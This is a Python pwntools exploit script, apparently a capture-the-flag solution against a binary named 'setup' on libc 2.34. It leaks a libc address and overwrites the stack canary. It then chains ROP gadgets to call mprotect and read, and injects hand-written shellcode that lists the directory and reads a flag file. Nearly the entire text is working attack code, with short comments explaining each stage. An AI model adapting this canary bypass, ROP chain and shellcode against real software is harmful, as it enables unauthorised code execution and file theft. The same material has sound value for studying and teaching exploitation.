#!/usr/bin/env python3

from pwn import *

exe = ELF('setup', checksec=False)
libc = ELF('libc-2.34.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* install+628
        b* install+703           
        b* install+833
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
# GDB()


##########################################
### Stage 1: Overwrite original canary ###
##########################################
# To find the address of original canary, 
# debug with gdb then use 'search' to search
# for all addresses to know which address contain
# original libc (that's the address before libc)
p.sendlineafter(b'> ', b'1')
p.sendafter(b'to: ', b'A'*(0x18) )
p.sendlineafter(b'> ', b'1')

p.recvuntil(b'A'*(0x18))
libc_leak = u64(p.recvline()[:6] + b'\x00'*2)
libc.address = libc_leak - 0xed88e
original_canary_addr = libc.address - 0x2898
info(hex(libc_leak))
info(hex(libc.address))
info(hex(original_canary_addr))

####################
### Stage 2: RCE ###
####################
pop_rax = 0x0000000000049f10 + libc.address
pop_rdx = 0x0000000000120272 + libc.address
pop_rdi = 0x000000000002e6c5 + libc.address
pop_rsi = 0x0000000000030081 + libc.address
syscall = 0x0000000000095196 + libc.address

# We have 3 address so do a read() is possible with
# rax = 0
# rdx = 0xffffffff
# rsi = rsp - ???

payload = flat(
    original_canary_addr,
    b'B'*0x58,
    pop_rdi, 0,
    syscall
)
p.sendafter(b'name: ', payload)
# We have unlimited input now.
# But I prefer shellcode so let's mprotect() and input
# shellcode, then execute our shellcode
payload = b'D'*0x21d0
payload += flat(
    # mprotect
    pop_rax, p64(0xa),
    pop_rdi, libc.address + 0x21a000,
    pop_rsi, 0x1000,
    pop_rdx, 7,
    syscall,

    # Input shellcode
    pop_rdi, 0,
    pop_rsi, libc.address + 0x21a800,
    pop_rdx, 0x1000,
    syscall,

    # Execute shellcode
    libc.address + 0x21a800,
    )
p.sendafter(b'Data: ', b'B'*8 + payload)

# C function in order:
# 1. mmap2(0x500000, 0x5000, 3, 1048610, 0, 0)
#
# 2. fd1 = open(".", 0, 0)
# 3. getents(fd1, $rsp, 0x1337)
#
# 4. fd2 = open(flag, 0, 0)
# 5. read(fd2, $rsp, 0x100)
# 6. write(1, $rsp, 0x100)
shellcode = asm(
    '''
    mov rax, 0xc0
    mov rbx, 0x500000
    mov rcx, 0x5000
    mov rdx, 3
    mov rsi, 1048610
    xor rdi, rdi
    xor rbp, rbp
    int 0x80

    mov rsp, 0x500a00

    mov rax, 5
    push 0x2e
    mov rbx, rsp
    xor rcx, rcx
    int 0x80

    mov rbx, rax
    mov rax, 0x8d
    mov rcx, rsp
    mov rdx, 0x1337
    int 0x80

    add rcx, 0x10
    
    mov rax, 5
    mov rbx, rcx
    xor rcx, rcx
    xor rdx, rdx
    int 0x80

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    mov rdi, 1
    mov rax, 1
    syscall
    ''', arch='amd64')
input()
p.sendafter(b'Hello World Setup Wizard\n\x1b[0m', shellcode)

print(p.recvall())
p.interactive()
